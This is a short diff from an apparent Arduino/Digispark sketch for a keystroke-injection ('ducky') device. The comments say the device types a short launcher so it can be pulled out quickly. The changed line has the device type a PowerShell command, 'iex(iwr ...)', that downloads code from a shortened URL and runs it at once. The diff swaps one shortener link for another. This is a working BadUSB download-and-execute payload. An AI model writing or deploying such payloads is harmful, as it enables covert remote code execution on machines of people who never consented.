@@ -26,7 +26,7 @@ void setup() { // The code goes inside setup since it should only run once.
 
   // Download the launcher for the rest of the script
   // We use a launcher instead of typing the command since it's shorter, and like that the ducky can be removed faster. 
-  DigiKeyboard.println("iex(iwr -usebasicparsing bit.ly/2WU9Dme)");
+  DigiKeyboard.println("iex(iwr -usebasicparsing bit.do/eSLgt)");
 
 
   
